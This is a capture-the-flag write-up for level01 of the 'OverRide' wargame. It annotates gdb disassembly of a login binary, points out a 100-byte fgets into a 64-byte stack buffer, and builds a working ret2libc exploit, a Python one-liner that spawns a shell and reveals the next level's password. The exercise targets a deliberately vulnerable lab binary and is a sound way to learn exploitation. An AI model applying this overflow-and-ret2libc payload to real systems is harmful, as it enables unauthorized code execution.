# OVERRIDE

## level01

```sh
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  printf
0x08048360  printf@plt
0x08048370  fgets
0x08048370  fgets@plt
0x08048380  puts
0x08048380  puts@plt
0x08048390  __gmon_start__
0x08048390  __gmon_start__@plt
0x080483a0  __libc_start_main
0x080483a0  __libc_start_main@plt
0x080483b0  _start
0x080483e0  __do_global_dtors_aux
0x08048440  frame_dummy
0x08048464  verify_user_name    # <------
0x080484a3  verify_user_pass    # <------
0x080484d0  main                # <------
0x080485c0  __libc_csu_init
0x08048630  __libc_csu_fini
0x08048632  __i686.get_pc_thunk.bx
0x08048640  __do_global_ctors_aux
0x0804866c  _fini
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080484d0 <+0>:     push   %ebp
   0x080484d1 <+1>:     mov    %esp,%ebp
   0x080484d3 <+3>:     push   %edi
   0x080484d4 <+4>:     push   %ebx
   0x080484d5 <+5>:     and    $0xfffffff0,%esp          # align stack to 16
   0x080484d8 <+8>:     sub    $0x60,%esp                # frame
                                                        # [esp+0x1c] = char pass[64]
                                                        # [esp+0x5c] = int result
   0x080484db <+11>:    lea    0x1c(%esp),%ebx           # ebx = &pass
   0x080484df <+15>:    mov    $0x0,%eax
   0x080484e4 <+20>:    mov    $0x10,%edx                # 16 * 4 = 64
   0x080484e9 <+25>:    mov    %ebx,%edi
   0x080484eb <+27>:    mov    %edx,%ecx
   0x080484ed <+29>:    rep stos %eax,%es:(%edi)         # memset(pass, 0, 64)
   0x080484ef <+31>:    movl   $0x0,0x5c(%esp)           # result = 0
   0x080484f7 <+39>:    movl   $0x80486b8,(%esp)
   0x080484fe <+46>:    call   0x8048380 <puts@plt>      # "********* ADMIN LOGIN PROMPT *********"
   0x08048503 <+51>:    mov    $0x80486df,%eax
   0x08048508 <+56>:    mov    %eax,(%esp)
   0x0804850b <+59>:    call   0x8048360 <printf@plt>    # "Enter Username: "
   0x08048510 <+64>:    mov    0x804a020,%eax            # stdin
   0x08048515 <+69>:    mov    %eax,0x8(%esp)
   0x08048519 <+73>:    movl   $0x100,0x4(%esp)          # 256
   0x08048521 <+81>:    movl   $0x804a040,(%esp)         # BSS username
   0x08048528 <+88>:    call   0x8048370 <fgets@plt>     # fgets(username, 256, stdin)
   0x0804852d <+93>:    call   0x8048464 <verify_user_name>
   0x08048532 <+98>:    mov    %eax,0x5c(%esp)           # result = memcmp(username, "dat_wil", 7)
   0x08048536 <+102>:   cmpl   $0x0,0x5c(%esp)
   0x0804853b <+107>:   je     0x8048550 <main+128>      # 0 = match → password prompt
   0x0804853d <+109>:   movl   $0x80486f0,(%esp)
   0x08048544 <+116>:   call   0x8048380 <puts@plt>      # "nope, incorrect username...\n"
   0x08048549 <+121>:   mov    $0x1,%eax
   0x0804854e <+126>:   jmp    0x80485af <main+223>      # return 1
   0x08048550 <+128>:   movl   $0x804870d,(%esp)
   0x08048557 <+135>:   call   0x8048380 <puts@plt>      # "Enter Password: "
   0x0804855c <+140>:   mov    0x804a020,%eax            # stdin
   0x08048561 <+145>:   mov    %eax,0x8(%esp)
   0x08048565 <+149>:   movl   $0x64,0x4(%esp)           # 100 bytes into 64-byte buf  ← overflow
   0x0804856d <+157>:   lea    0x1c(%esp),%eax           # &pass
   0x08048571 <+161>:   mov    %eax,(%esp)
   0x08048574 <+164>:   call   0x8048370 <fgets@plt>     # fgets(pass, 100, stdin)
   0x08048579 <+169>:   lea    0x1c(%esp),%eax
   0x0804857d <+173>:   mov    %eax,(%esp)
   0x08048580 <+176>:   call   0x80484a3 <verify_user_pass>
   0x08048585 <+181>:   mov    %eax,0x5c(%esp)           # result = memcmp(pass, "admin", 5)
   0x08048589 <+185>:   cmpl   $0x0,0x5c(%esp)
   0x0804858e <+190>:   je     0x8048597 <main+199>      # == 0 → fail puts
   0x08048590 <+192>:   cmpl   $0x0,0x5c(%esp)
   0x08048595 <+197>:   je     0x80485aa <main+218>      # == 0 → return 0 (dead: same test, no store in between)
   0x08048597 <+199>:   movl   $0x804871e,(%esp)
   0x0804859e <+206>:   call   0x8048380 <puts@plt>      # "nope, incorrect password...\n"
   0x080485a3 <+211>:   mov    $0x1,%eax
   0x080485a8 <+216>:   jmp    0x80485af <main+223>      # return 1
   0x080485aa <+218>:   mov    $0x0,%eax                 # success return 0 — not reached on a normal login
   0x080485af <+223>:   lea    -0x8(%ebp),%esp
   0x080485b2 <+226>:   pop    %ebx
   0x080485b3 <+227>:   pop    %edi
   0x080485b4 <+228>:   pop    %ebp
   0x080485b5 <+229>:   ret
End of assembler dump.
```

```sh
(gdb) disas verify_user_name
Dump of assembler code for function verify_user_name:
   0x08048464 <+0>:     push   %ebp
   0x08048465 <+1>:     mov    %esp,%ebp
   0x08048467 <+3>:     push   %edi
   0x08048468 <+4>:     push   %esi
   0x08048469 <+5>:     sub    $0x10,%esp
   0x0804846c <+8>:     movl   $0x8048690,(%esp)
   0x08048473 <+15>:    call   0x8048380 <puts@plt>      # "verifying username....\n"
   0x08048478 <+20>:    mov    $0x804a040,%edx           # input: BSS username
   0x0804847d <+25>:    mov    $0x80486a8,%eax           # expected: "dat_wil"
   0x08048482 <+30>:    mov    $0x7,%ecx                 # 7 bytes
   0x08048487 <+35>:    mov    %edx,%esi
   0x08048489 <+37>:    mov    %eax,%edi
   0x0804848b <+39>:    repz cmpsb %es:(%edi),%ds:(%esi) # memcmp(username, "dat_wil", 7)
   0x0804848d <+41>:    seta   %dl
   0x08048490 <+44>:    setb   %al
   0x08048493 <+47>:    mov    %edx,%ecx
   0x08048495 <+49>:    sub    %al,%cl                   # 0 / +1 / -1
   0x08048497 <+51>:    mov    %ecx,%eax
   0x08048499 <+53>:    movsbl %al,%eax                  # 0 = match
   0x0804849c <+56>:    add    $0x10,%esp
   0x0804849f <+59>:    pop    %esi
   0x080484a0 <+60>:    pop    %edi
   0x080484a1 <+61>:    pop    %ebp
   0x080484a2 <+62>:    ret
End of assembler dump.
```

```sh
(gdb) disas verify_user_pass
Dump of assembler code for function verify_user_pass:
   0x080484a3 <+0>:     push   %ebp
   0x080484a4 <+1>:     mov    %esp,%ebp
   0x080484a6 <+3>:     push   %edi
   0x080484a7 <+4>:     push   %esi
   0x080484a8 <+5>:     mov    0x8(%ebp),%eax            # arg: &pass from main
   0x080484ab <+8>:     mov    %eax,%edx
   0x080484ad <+10>:    mov    $0x80486b0,%eax           # expected: "admin"
   0x080484b2 <+15>:    mov    $0x5,%ecx                 # 5 bytes
   0x080484b7 <+20>:    mov    %edx,%esi
   0x080484b9 <+22>:    mov    %eax,%edi
   0x080484bb <+24>:    repz cmpsb %es:(%edi),%ds:(%esi) # memcmp(pass, "admin", 5)
   0x080484bd <+26>:    seta   %dl
   0x080484c0 <+29>:    setb   %al
   0x080484c3 <+32>:    mov    %edx,%ecx
   0x080484c5 <+34>:    sub    %al,%cl
   0x080484c7 <+36>:    mov    %ecx,%eax
   0x080484c9 <+38>:    movsbl %al,%eax                  # 0 = match
   0x080484cc <+41>:    pop    %esi
   0x080484cd <+42>:    pop    %edi
   0x080484ce <+43>:    pop    %ebp
   0x080484cf <+44>:    ret
End of assembler dump.
```

### Program flow
- Banner, then fgets(username, 256, stdin) into BSS 0x0804a040.
- memcmp(username, "dat_wil", 7) — non-zero exits 1.
- fgets(password, 100, stdin) into a 64-byte stack buffer.
- memcmp(password, "admin", 5) stored in result.

### Ret2libc

Clean angle for a ret2libc, let's retrieve the different addresses we need

```sh
(gdb) run
Starting program: /home/users/level01/level01 

Breakpoint 1, 0x080484d5 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) info proc map
process 1694
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        ...
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        ...

(gdb) find 0xf7e2c000, 0xf7fd0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

```sh
libc-2.15.so    0xf7e2c000
system          0xf7e6aed0
exit            0xf7e5eb70
"/bin/sh"       0xf7f897ec
```

Now we need to calculate the EIP offset

```sh
(gdb) run
Starting program: /home/users/level01/level01 
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password: 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
nope, incorrect password...


Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? () # offset 80
```

### Payload

```t
[ "dat_wil\n" ]                                                 # username
[ 80 × 'A' ]                                                    # padding to skip to ebp+4
[ system      ]   0xf7e6aed0  →  \xd0\xae\xe6\xf7               # EIP value
[ exit ret   ]    0xf7e5eb70  →  \x70\xeb\xe5\xf7               # ret for system
[ ptr "/bin/sh" ] 0xf7f897ec →  \xec\x97\xf8\xf7                # arg1 for system
[ \n ]
```

```sh
level01@OverRide:~$ (python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7\x70\xeb\xe5\xf7\xec\x97\xf8\xf7"' ; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password: 
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```